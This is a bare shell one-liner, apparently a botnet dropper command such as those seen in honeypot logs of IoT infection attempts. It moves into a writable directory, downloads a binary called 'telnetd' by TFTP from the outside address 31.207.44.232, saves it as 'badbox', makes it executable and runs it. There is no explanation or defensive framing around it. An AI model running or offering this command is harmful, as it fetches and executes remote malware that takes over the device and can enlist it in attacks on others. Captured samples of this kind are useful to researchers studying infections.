cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 31.207.44.232;cat telnetd >badbox;chmod +x *;./badbox
